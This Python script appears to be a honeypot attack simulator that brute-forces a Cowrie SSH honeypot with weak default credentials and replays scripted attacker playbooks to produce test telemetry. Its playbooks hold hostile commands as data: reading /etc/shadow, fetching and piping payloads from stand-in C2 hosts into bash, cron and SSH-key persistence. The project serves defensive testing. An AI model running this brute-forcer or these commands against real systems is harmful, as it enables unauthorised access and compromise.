#!/usr/bin/env python3
"""Honeypot attack simulator — realistic interactive SSH attacker.

Uses Paramiko to open a proper TTY channel against the Cowrie honeypot,
sending commands with human-like delays. This generates authentic
cowrie.command.input events with keystroke-level interaction that the
pipeline can classify and enrich.

Usage:
    python3 scripts/attack-simulator.py --host 192.168.1.79 --sessions 10
    python3 scripts/attack-simulator.py --host 192.168.1.79 --sessions 25 --aggressive
    python3 scripts/attack-simulator.py --host 192.168.1.79 --brute-only --count 50
"""

from __future__ import annotations

import argparse
import random
import socket
import sys
import time
from typing import Any

import paramiko

# ── Credential lists (real-world brute force patterns) ──────────────────

BRUTE_FORCE_CREDS: list[tuple[str, str]] = [
    ("root", "root"),
    ("root", "admin"),
    ("root", "123456"),
    ("root", "password"),
    ("root", "toor"),
    ("root", "raspberry"),
    ("root", "12345678"),
    ("root", "qwerty"),
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("ubuntu", "ubuntu"),
    ("ubuntu", "123456"),
    ("pi", "raspberry"),
    ("pi", "raspberrypi"),
    ("test", "test"),
    ("user", "123456"),
    ("oracle", "oracle"),
    ("postgres", "postgres"),
    ("git", "git"),
    ("debian", "debian"),
    ("guest", "guest"),
    ("ftpuser", "ftpuser"),
    ("mysql", "mysql"),
    ("tomcat", "tomcat"),
    ("nagios", "nagios"),
    ("support", "support"),
]

# ── Attack playbooks ────────────────────────────────────────────────────

# Each playbook is a list of (command, min_delay, max_delay) tuples.
# Delays simulate human typing/reading between commands.

RECON_PLAYBOOK: list[tuple[str, float, float]] = [
    ("whoami", 0.3, 0.8),
    ("id", 0.2, 0.5),
    ("uname -a", 0.3, 0.7),
    ("hostname", 0.2, 0.4),
    ("cat /proc/cpuinfo 2>/dev/null | head -5", 0.5, 1.2),
    ("free -m", 0.3, 0.6),
    ("df -h", 0.3, 0.6),
    ("ifconfig 2>/dev/null || ip addr", 0.5, 1.0),
    ("netstat -tulpn 2>/dev/null || ss -tulpn", 0.5, 1.0),
    ("ps aux 2>/dev/null | head -10", 0.4, 0.8),
    ("ls -la /home", 0.3, 0.6),
    ("cat /etc/passwd", 0.3, 0.6),
    ("cat /etc/shadow 2>/dev/null", 0.3, 0.5),
    ("last 2>/dev/null | head -5", 0.3, 0.6),
    ("w", 0.2, 0.5),
]

DOWNLOAD_PLAYBOOK: list[tuple[str, float, float]] = [
    ("wget http://103.45.67.89/payload.sh -O /tmp/payload.sh", 1.0, 2.0),
    ("curl -s http://evil-c2.malware.net/backdoor.py -o /tmp/.backdoor.py", 1.0, 2.5),
    ("wget http://botnet-master.xyz/miner.tar.gz -O /tmp/.miner.tar.gz", 1.0, 2.0),
    ("curl -s http://185.220.101.34/scanner.sh 2>/dev/null | bash", 1.0, 2.5),
    ("wget http://paste.ee/r/abc123 -O /tmp/setup.sh", 1.0, 2.0),
]

PERSISTENCE_PLAYBOOK: list[tuple[str, float, float]] = [
    ("chmod +x /tmp/payload.sh", 0.3, 0.6),
    ("echo '*/5 * * * * /tmp/.backdoor.py' | crontab - 2>/dev/null", 0.8, 1.5),
    ("echo 'ssh-rsa AAAAB3NzaC...attacker@kali' >> ~/.ssh/authorized_keys 2>/dev/null", 0.5, 1.0),
    ("nohup /tmp/payload.sh >/dev/null 2>&1 &", 0.5, 1.0),
    ("systemctl enable sshd 2>/dev/null", 0.3, 0.7),
]

PRIVESC_PLAYBOOK: list[tuple[str, float, float]] = [
    ("sudo -l 2>/dev/null", 0.3, 0.7),
    ("find / -perm -4000 -type f 2>/dev/null | head -10", 0.6, 1.2),
    ("cat /etc/crontab 2>/dev/null", 0.3, 0.6),
    ("ls -la /etc/sudoers.d/ 2>/dev/null", 0.3, 0.5),
    ("cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'", 0.4, 0.8),
]


# ── Session runner ──────────────────────────────────────────────────────


def _human_delay(min_s: float, max_s: float) -> None:
    time.sleep(random.uniform(min_s, max_s))


def run_attack_session(
    host: str,
    port: int,
    username: str,
    password: str,
    playbook: list[tuple[str, float, float]],
    connect_timeout: int = 10,
) -> bool:
    """Open an interactive SSH session and run a playbook with delays.

    Returns True if authentication succeeded (even if commands later fail).
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            allow_agent=False,
            look_for_keys=False,
            timeout=connect_timeout,
        )
    except paramiko.AuthenticationException:
        print(f"  [-] {username}:{password} — AUTH FAILED")
        return False
    except (socket.error, paramiko.SSHException, OSError) as exc:
        print(f"  [!] {username}:{password} — CONNECTION ERROR: {exc}")
        return False

    # Open an interactive shell channel (PTY — Cowrie captures this)
    try:
        channel = client.invoke_shell(width=120, height=40)
        _human_delay(0.5, 1.0)

        # Drain the initial banner/motd
        if channel.recv_ready():
            channel.recv(4096)

        for cmd, min_delay, max_delay in playbook:
            # Type the command
            channel.send((cmd + "\n").encode("utf-8"))
            _human_delay(min_delay, max_delay)

            # Wait for output to settle
            settle = 0
            while settle < 3:
                if channel.recv_ready():
                    channel.recv(4096)
                    settle = 0
                else:
                    _human_delay(0.1, 0.3)
                    settle += 1

        # Clean exit
        channel.send(b"exit\n")
        _human_delay(0.2, 0.5)
        channel.close()

    except (socket.error, paramiko.SSHException, OSError) as exc:
        print(f"  [!] {username}:{password} — SESSION ERROR: {exc}")
    finally:
        client.close()

    print(f"  [+] {username}:{password} — OK ({len(playbook)} commands)")
    return True


def build_playbook(playbook_type: str) -> list[tuple[str, float, float]]:
    """Assemble a realistic command chain based on attack type."""
    cmds: list[tuple[str, float, float]] = []

    if playbook_type == "brute":
        return [("exit", 0.1, 0.3)]

    if playbook_type == "full":
        # Recon first
        cmds.extend(random.sample(RECON_PLAYBOOK, min(5, len(RECON_PLAYBOOK))))
        # Sometimes download
        if random.random() < 0.5:
            cmds.extend(random.sample(DOWNLOAD_PLAYBOOK, 1))
        # Sometimes persistence
        if random.random() < 0.25:
            cmds.extend(random.sample(PERSISTENCE_PLAYBOOK, 1))
        # Sometimes privesc
        if random.random() < 0.2:
            cmds.extend(random.sample(PRIVESC_PLAYBOOK, 1))
        cmds.append(("exit", 0.1, 0.3))
        return cmds

    return [("exit", 0.1, 0.3)]


# ── CLI ─────────────────────────────────────────────────────────────────


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Realistic honeypot attack simulator (Paramiko interactive SSH)."
    )
    parser.add_argument(
        "--host", default="192.168.1.79",
        help="Honeypot host (default: 192.168.1.79)",
    )
    parser.add_argument(
        "--port", type=int, default=2222,
        help="Honeypot SSH port (default: 2222)",
    )
    parser.add_argument(
        "--sessions", type=int, default=10,
        help="Number of attack sessions (default: 10)",
    )
    parser.add_argument(
        "--delay", type=float, default=3.0,
        help="Delay between sessions in seconds (default: 3.0)",
    )
    parser.add_argument(
        "--brute-only", action="store_true",
        help="Only brute force login attempts, no post-login commands",
    )
    parser.add_argument(
        "--aggressive", action="store_true",
        help="More commands per session, shorter inter-session delays",
    )
    parser.add_argument(
        "--timeout", type=int, default=10,
        help="Connection timeout per session (default: 10s)",
    )
    args = parser.parse_args()

    print(f"\n{'='*60}")
    print("Honeypot Attack Simulator (Paramiko — Interactive TTY)")
    print(f"Target: {args.host}:{args.port}")
    print(f"Plan: {args.sessions} sessions")
    print(f"{'='*60}\n")

    success = 0
    failed = 0

    for i in range(args.sessions):
        username, password = random.choice(BRUTE_FORCE_CREDS)

        if args.brute_only:
            playbook = build_playbook("brute")
            label = "BRUTE"
        else:
            playbook = build_playbook("full")
            cmd_count = len([c for c in playbook if c[0] != "exit"])
            label = f"FULL ({cmd_count} cmds)"

        print(f"[{i+1}/{args.sessions}] {label} — {username}:{password}")
        ok = run_attack_session(args.host, args.port, username, password, playbook, args.timeout)

        if ok:
            success += 1
        else:
            failed += 1

        if i < args.sessions - 1:
            d = args.delay * (0.3 if args.aggressive else 1.0)
            time.sleep(d)

    print(f"\n{'='*60}")
    print(f"Done. {success} sessions succeeded, {failed} failed.")
    print(f"Dashboard: http://{args.host}:5173/dashboard")
    print(f"{'='*60}\n")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
